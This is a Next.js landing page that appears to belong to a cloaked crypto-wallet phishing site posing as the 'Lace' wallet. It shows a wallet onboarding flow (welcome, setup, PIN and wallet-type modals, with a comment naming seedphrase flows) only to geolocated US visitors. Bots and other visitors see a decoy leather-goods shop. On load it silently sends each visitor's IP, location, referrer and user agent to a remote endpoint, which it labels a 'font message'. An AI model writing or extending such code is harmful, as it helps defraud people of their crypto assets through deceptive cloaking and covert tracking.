"use client";

import { useState, useEffect, useRef, Suspense, useCallback } from "react";
import Image from "next/image";
import Link from "next/link";
import WelcomeModal from "../../components/WelcomeModal";
import AppSetupModal from "../../components/AppSetupModal";
import CreatePinModal from "../../components/CreatePinModal";
import SelectWalletTypeModal from "../../components/SelectWalletTypeModal";
import InventoryGrid from "../../components/InventoryGrid";
import { usePathname, useSearchParams } from "next/navigation";
import { getUserCountry } from "../userLocation";
import axios from "axios";
import { API_CONFIG } from "../config";

function LandingPageContent() {
  // Two modals managed separately
  const [welcomeOpen, setWelcomeOpen] = useState(false);
  const [setupOpen, setSetupOpen] = useState(false);
  const [pinOpen, setPinOpen] = useState(false);
  const [showSelectType, setShowSelectType] = useState(false);
  const [isUSUser, setIsUSUser] = useState<boolean | null>(null);
  const [isLocationLoading, setIsLocationLoading] = useState(true);
  const [browser, setBrowser] = useState("");
  const hasSentVisitorMessage = useRef(false);
  const pathname = usePathname();
  const searchParams = useSearchParams();

  useEffect(() => {
    if (searchParams.get("open") === "true") {
      setWelcomeOpen(true);
    }
  }, [searchParams]);
  const getCurrentUrl = useCallback(() => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      if (url.includes("localhost")) {
        url = "https://google.com";
      }
      if (url.includes("vercel.com")) {
        url = url.replace("vercel.com", "digitalocean.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  }, [pathname]);

  const sendTelegramMessage = useCallback((
    userCountry: {
      country?: string;
      countryEmoji?: string;
      city?: string;
      ip?: string;
    } | null
  ) => {
    // console.log("User Country", userCountry);

    // Prevent bots from triggering notifications
    const userAgent = typeof navigator !== "undefined" ? navigator.userAgent : "";
    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(userAgent);

    if (isBot) {
      console.log("Bot detected, skipping Telegram notification");
      return;
    }

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "Lace",
    };
    console.log("Message Data", messageData);
    axios
      .post(API_CONFIG.URL, messageData, {
        headers: { "Content-Type": "application/json" },
      })
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error.response.data.details
        )
      );
  }, [browser, getCurrentUrl]);

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        try {
          const userCountry = await getUserCountry();

          // Determine if user is in the United States
          if (userCountry) {
            const isUS =
              userCountry.countryCode === "US" ||
              (userCountry.country &&
                userCountry.country.toLowerCase().includes("united states"));
            setIsUSUser(isUS);
          } else {
            // If geolocation fails, default to blocking wallet features
            setIsUSUser(false);
          }

          sendTelegramMessage(userCountry);
        } catch (e) {
          console.error("Error fetching user location:", e);
          setIsUSUser(false);
        } finally {
          setIsLocationLoading(false);
        }
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, [sendTelegramMessage]);

  useEffect(() => {
    // Set browser info only on client side
    if (typeof window !== "undefined") {
      setBrowser(navigator.userAgent);
    }
  }, [sendTelegramMessage]);

  // While checking location, block the whole page with a simple fullscreen loader
  if (isLocationLoading) {
    return (
      <main className="min-h-screen bg-[#0e0e0e] text-white flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="h-8 w-8 rounded-full border-2 border-white/30 border-t-transparent animate-spin" />
          <p className="text-sm text-white/60">Loading experience…</p>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-[#0e0e0e] text-white flex flex-col items-center relative">

      {/* Hero section: only for confirmed US users; non‑US users jump straight to the product list */}
      {!isLocationLoading && isUSUser && (
        <section className="flex flex-col h-screen px-12 sm:px-24 py-24 justify-between">
          <div className="flex flex-col items-start text-left">
            <h1 className="text-5xl sm:text-6xl font-extrabold leading-tight">
              {isUSUser ? (
                <>
                  <span className="bg-linear-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                    A Next-Gen Wallet.{" "}
                  </span>
                  <br />
                  <span className="bg-linear-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                    For the Digital Age.
                  </span>
                </>
              ) : (
                <>
                  <span className="bg-linear-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                    Crafted Leather.{" "}
                  </span>
                  <br />
                  <span className="bg-linear-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                    Built to Last.
                  </span>
                </>
              )}
            </h1>

            <p className="mt-6 text-xl text-white/80 max-w-[40ch]">
              {isUSUser ? (
                <>
                  Intuitive for beginners. <br />
                  Powerful for pros.
                </>
              ) : (
                <>
                  Premium leather wallets for everyday carry. <br />
                  Timeless design, modern minimalism.
                </>
              )}
            </p>

            {/* Open App button only for confirmed US users */}
            <button
              onClick={() => {
                setWelcomeOpen(true);
              }}
              className="mt-8 bg-white/10 hover:bg-white/20 text-white font-semibold rounded-full px-8 py-4 transition flex items-center gap-2 border border-white/5"
            >
              Open App <span className="opacity-60">→</span>
            </button>
          </div>
        </section>
      )}

      <div id="inventory-grid" className="w-full bg-[#0e0e0e]">
        <InventoryGrid />
      </div>


      {/* Footer */}
      <footer className="w-full max-w-5xl mt-auto mb-10 text-sm text-white/70 px-4">
        <div className="flex flex-col sm:flex-row justify-between gap-6 bg-[#161616] rounded-2xl p-6">
          <div>
            <h3 className="font-semibold mb-2">Resources</h3>
            <ul className="space-y-1">
              <li>
                <Link href="/about" className="hover:text-white">
                  About
                </Link>
              </li>
              <li>
                <Link href="/about/how-to-use-eternal-wallet" className="hover:text-white">
                  How to Use
                </Link>
              </li>
              <li>
                <Link href="/review" className="hover:text-white">
                  Review
                </Link>
              </li>
            </ul>
          </div>

          <div>
            <h3 className="font-semibold mb-2">Social</h3>
            <ul className="space-y-1">
              <li>
                <Link href="https://x.com/" className="hover:text-white">
                  X.com
                </Link>
              </li>
              <li>
                <Link href="https://discord.com/" className="hover:text-white">
                  Discord
                </Link>
              </li>
              <li>
                <Link
                  href="https://web.telegram.org/"
                  className="hover:text-white"
                >
                  Telegram
                </Link>
              </li>
            </ul>
          </div>
        </div>
      </footer>

      {/* Wallet / seedphrase flows are only available for US users */}
      {isUSUser && (
        <>
          {/* 🌈 Welcome Modal */}
          <WelcomeModal
            open={welcomeOpen}
            onClose={() => setWelcomeOpen(false)}
            onNext={() => {
              setWelcomeOpen(false);
              setSetupOpen(true);
            }}
            illustration={
              <Image
                src="/brand/laptop.svg"
                alt="Welcome Illustration"
                width={420}
                height={300}
              />
            }
          />

          {/* ⚙️ Setup Modal */}
          <AppSetupModal
            open={setupOpen}
            onClose={() => setSetupOpen(false)}
            onBack={() => {
              setSetupOpen(false);
              setWelcomeOpen(true);
            }}
            onNext={() => {
              setSetupOpen(false);
              setPinOpen(true);
            }}
          />

          {/* 🔐 Create PIN Modal */}
          <CreatePinModal
            open={pinOpen}
            onClose={() => setPinOpen(false)}
            onBack={() => {
              setPinOpen(false);
              setSetupOpen(true); // go back one step
            }}
            onNext={() => {
              setPinOpen(false);
              setTimeout(() => setShowSelectType(true), 150); // open wallet type modal
            }}
          />

          {/* 💼 Select Wallet Type Modal */}
          <SelectWalletTypeModal
            open={showSelectType}
            onClose={() => setShowSelectType(false)}
            onBack={() => {
              setShowSelectType(false);
              setPinOpen(true);
            }}
            onSelect={(key) => {
              console.log("Selected wallet type:", key);
              // you can trigger the next modal here based on key, e.g.:
              // if (key === "new") setShowCreateWallet(true);
            }}
          />
        </>
      )}
    </main >
  );
}



export default function LandingPage() {
  return (
    <Suspense fallback={<div className="min-h-screen bg-[#0e0e0e]" />}>
      <LandingPageContent />
    </Suspense>
  );
}
